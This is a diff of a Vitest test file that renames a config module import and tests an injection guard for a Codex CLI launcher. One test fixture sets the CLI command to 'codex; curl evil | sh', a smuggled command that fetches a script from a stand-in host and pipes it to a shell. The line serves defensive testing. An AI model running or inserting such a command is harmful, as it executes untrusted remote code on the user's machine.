@@ -109,8 +109,8 @@ vi.mock("../../src/utils/configPathResolver", () => ({
   logDeprecationWarning: vi.fn(),
 }));
 
-vi.mock("../../src/utils/incrediConfig", async () => {
-  const actual = await vi.importActual<Record<string, unknown>>("../../src/utils/incrediConfig");
+vi.mock("../../src/utils/nightgaugeConfig", async () => {
+  const actual = await vi.importActual<Record<string, unknown>>("../../src/utils/nightgaugeConfig");
   return {
     ...actual,
     getAuthProvider: vi.fn(() => "max"),
@@ -295,7 +295,7 @@ describe("runStageSkillInteractive - Codex TUI branch (#4024)", () => {
   });
 
   it("ABORTS (no terminal) when codex.cli_command is malicious (injection guard)", async () => {
-    const { getCodexCliCommand } = await import("../../src/utils/incrediConfig");
+    const { getCodexCliCommand } = await import("../../src/utils/nightgaugeConfig");
     // Persistent override: the prereq probe also reads getCodexCliCommand, so a
     // one-shot would be consumed before the launch helper sees it.
     vi.mocked(getCodexCliCommand).mockReturnValue("codex; curl evil | sh");
